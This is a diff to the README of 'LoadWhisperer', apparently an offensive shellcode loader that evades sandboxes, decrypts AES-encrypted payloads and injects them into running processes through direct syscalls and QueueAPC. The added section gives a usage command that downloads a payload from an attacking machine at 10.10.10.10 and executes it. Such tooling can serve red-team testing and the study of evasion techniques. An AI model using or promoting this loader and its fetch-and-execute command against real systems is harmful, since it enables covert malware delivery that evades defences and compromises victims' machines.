@@ -1,6 +1,13 @@
 # LoadWhisperer
 LoadWhisperer uses direct syscalls to inject shellcode into a currently running process using the QueueAPC method, after sandbox detection and evasion and decrypting AES-encrypted shellcode. Read more about the QueueAPC method in another C# project I did [here](https://github.com/lemmyz4n3771/QueueUserAPC-ProcInjection).
 
+## Update 2
+
+You can now host large payloads on your attacking machine to then download and execute using LoadWhisperer as an executable. This is pretty useful, given that Visual Studio doesn't like large array buffers and a smaller binary is more versatile. Example usage:
+```
+C:\temp>LoadWhisperer.exe 10.10.10.10 80 pe.enc key.bin
+```
+
 ## Update
 
 Added DLL functionality to LoadWhisperer. Build the solution and test it directly like so:
